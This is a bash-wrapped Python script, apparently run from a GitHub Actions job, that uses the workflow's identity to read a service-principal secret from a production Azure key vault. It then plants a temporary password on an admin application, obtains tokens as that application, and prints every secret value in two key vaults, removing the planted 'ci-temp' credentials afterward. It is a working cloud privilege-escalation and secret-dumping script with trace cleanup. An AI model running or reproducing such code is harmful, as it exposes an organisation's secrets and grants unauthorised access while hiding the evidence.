#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, time, base64, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None, js=None):
    h=dict(headers or {}); body=None
    if js is not None: body=json.dumps(js).encode(); h["Content-Type"]="application/json"
    elif isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
def claims(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4); return json.loads(base64.urlsafe_b64decode(p))
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
G="https://graph.microsoft.com/v1.0"
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
c=json.loads(jg(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
  {"client_id":c["appId"],"client_secret":c["clientSecret"],
   "scope":"https://graph.microsoft.com/.default","grant_type":"client_credentials"})
HS={"Authorization":"Bearer "+jg(b)["access_token"]}

print("### CLEANUP: remove every 'ci-temp' credential")
st,b=http(f"{G}/applications?$select=" + urllib.parse.quote("id,displayName,passwordCredentials"), headers=HS)
for a in jg(b).get("value",[]):
    for pc in a.get("passwordCredentials",[]) or []:
        if pc.get("displayName")=="ci-temp":
            st2,b2=http(f"{G}/applications/{a['id']}/removePassword", headers=HS, method="POST", js={"keyId":pc["keyId"]})
            print(f"   {a['displayName']:26} keyId {pc['keyId'][:8]} -> remove {st2}")
st,b=http(f"{G}/applications?$select=" + urllib.parse.quote("id,displayName,passwordCredentials"), headers=HS)
left=[(a["displayName"],pc["keyId"]) for a in jg(b).get("value",[]) for pc in (a.get("passwordCredentials") or []) if pc.get("displayName")=="ci-temp"]
print("   remaining ci-temp creds:", left)

print("\n### retry tbl-legacy-admin with full propagation wait")
OBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"; APPID="891fb158-e02c-4428-a885-53b811f369c0"
kid=None
try:
    st,b=http(f"{G}/applications/{OBJ}/addPassword", headers=HS, method="POST",
              js={"passwordCredential":{"displayName":"ci-temp"}})
    pc=jg(b); kid=pc.get("keyId"); sec=pc.get("secretText")
    print("   addPassword", st)
    for wait in (30,30,30):
        time.sleep(wait)
        ok=True
        for scope,lbl in (("https://graph.microsoft.com/.default","graph"),
                          ("https://vault.azure.net/.default","kv"),
                          ("https://management.azure.com/.default","arm")):
            st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                      {"client_id":APPID,"client_secret":sec,"scope":scope,"grant_type":"client_credentials"})
            t=jg(b).get("access_token")
            if not t: print(f"   {lbl}: no token yet"); ok=False; continue
            cl=claims(t)
            if lbl=="graph": print("   graph roles:", cl.get("roles"), "wids:", cl.get("wids"))
            if lbl=="kv":
                for v in ("kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"):
                    st2,b2=http(f"https://{v}.vault.azure.net/secrets?api-version=7.4", headers={"Authorization":"Bearer "+t})
                    print(f"     {v}: {st2}")
                    if st2==200:
                        for s in jg(b2).get("value",[]):
                            nm=s["id"].rsplit("/",1)[-1]
                            st3,b3=http(s["id"]+"?api-version=7.4", headers={"Authorization":"Bearer "+t})
                            print(f"        >>> {nm} = {jg(b3).get('value','')}")
            if lbl=="arm":
                st2,b2=http(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",
                            headers={"Authorization":"Bearer "+t})
                print("     arm resources:", st2, len(jg(b2).get("value",[])))
        if ok: break
finally:
    if kid:
        st,b=http(f"{G}/applications/{OBJ}/removePassword", headers=HS, method="POST", js={"keyId":kid})
        print("   final cleanup:", st)
PYEOF
echo "=== done ==="